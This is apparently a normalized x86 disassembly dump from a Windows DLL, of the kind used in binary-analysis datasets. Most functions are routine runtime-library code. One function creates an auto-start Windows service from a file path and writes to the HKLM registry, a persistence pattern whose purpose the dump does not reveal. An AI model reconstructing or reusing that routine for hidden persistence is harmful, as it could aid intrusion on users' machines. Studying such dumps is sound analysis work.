mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10027580
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp edx ecx
je r-xdata
push edi
mov edi [ ebx ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebx ]
cmp esi [ edx + 0xc ]
jb r-xdata
mov edx ecx
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
cmp [ ecx + 0xc ] edi
jae r-xdata
pop edi
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_100275d9
push 0x64
mov eax sub_1008567f
call sub_1003fae8
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_10071f2c
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_1000ff3d
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x38 ] eax
je r-xdata
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] edi
call sub_1004a330
add esp 0xc
push [ ebp - 0x5c ]
movzx ebx ax
mov eax [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_10069d0f
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2b
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
inc eax
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_1005a5dc
mov [ ebp - 0x6c ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001c121
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_1005a5dc
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x60 ]
push eax
call sub_1005e238
mov edi [ ebp - 0x54 ]
push [ ebp - 0x6c ]
mov [ edi ] al
movsx eax al
push eax
push r--data
call sub_1007f360
add esp 0x14
test eax eax
je r-xdata
mov ecx esi
call sub_1001c121
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
mov eax [ ebp - 0x64 ]
push [ ebp - 0x5c ]
add eax 0x1f
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x70 ] eax
call sub_10069d0f
test al al
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x54 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x8
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
xor ebx ebx
push ebx
push 0x78
call sub_1004a330
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp edi [ ebp - 0x70 ]
jae r-xdata
cmp [ edi ] 0x30
je r-xdata
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_1002c8c0
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
mov eax [ ebp - 0x50 ]
call sub_1004642f
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
mov edi [ ebp - 0x68 ]
test di di
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc edi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] bl
call sub_1005a5dc
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_1004a330
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] di
jne r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_10027980
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
dec eax
mov [ ecx + 0x4 ] eax
mov ecx [ ecx ]
mov eax [ ecx + eax * 4 ]
pop ebp
retn
pop ebp
retn
sub_100279a0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x8 ] eax
call sub_1007f5d0
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x8 ] 0x0
sub_100279fb
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001b303
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
push esi
mov esi [ ebp - 0x4 ]
mov edx 0x76c
cmp esi edx
jl r-xdata
cmp esi 0x87
jle r-xdata
sub esi edx
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ eax + 0x14 ] esi
pop esi
or eax 0x2
mov [ ecx ] eax
sub_10027a80
push ebp
mov ebp esp
sub esp 0xa90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xa88 ] eax
mov [ ebp - 0xa8c ] ecx
mov [ ebp - 0xa80 ] edx
mov [ ebp - 0xa78 ] esi
mov [ ebp - 0xa90 ] ebx
test eax eax
je r-xdata
mov eax 0x1
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
test ebx ebx
je r-xdata
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
lea eax [ ebp - 0xa74 ]
push eax
push 0x104
push edi
call [ GetFullPathNameW@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0xa74 ]
push ecx
push 0x1
push 0x2
push 0x10
push 0xf003f
push esi
push esi
push ebx
call [ CreateServiceW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x2 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov esi [ CloseServiceHandle@IAT ]
push eax
call esi
push ebx
call esi
lea edx [ ebp - 0x4c ]
mov eax 0x4
call sub_10058f40
mov ecx edx
lea eax [ ebp - 0x86c ]
call sub_10069590
lea edx [ ebp - 0x86c ]
lea eax [ ebp - 0xa78 ]
call sub_1005be10
lea edx [ ebp - 0xa84 ]
mov eax 0x1
call sub_10058f40
lea edx [ ebp - 0xa78 ]
mov eax 0x2
call sub_10058f40
lea edx [ ebp - 0xa7c ]
xor eax eax
call sub_10058f40
mov esi [ ebp - 0xa88 ]
push edx
push esi
call [ StrStrW@IAT ]
xor edi edi
lea ecx [ ebp - 0x664 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub esi ecx
lea ebx [ ebp - 0xa78 ]
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xa7c ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop esi
lea eax [ edx + 0x7 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop esi
lea eax [ edx + 0x4 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edi [ ebp - 0xa8c ]
lea ecx [ ebp - 0xa7c ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x8
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xa78 ]
push eax
lea ebx [ ebp - 0x664 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push edi
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea edx [ ebp - 0xa78 ]
push edx
lea ebx [ ebp - 0x664 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x6
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xa7c ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xa
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x9
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa84 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea ecx [ ebp - 0xa78 ]
push ecx
lea ebx [ ebp - 0x664 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ ebp - 0xa7c ]
push eax
lea ebx [ ebp - 0x664 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xc
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0xb
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xa80 ]
push ecx
lea ebx [ ebp - 0x664 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xd
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xa90 ]
push 0x1
push edx
lea ecx [ ebp - 0x664 ]
lea eax [ ebp - 0x86c ]
mov edx 0x80000002
call sub_10047450
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xe
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0xf
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10027ea5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10027f26
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_10027f5a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push 0x0
push 0x1
call sub_1003c519
cmp [ esi + 0x14 ] 0x8
jae r-xdata
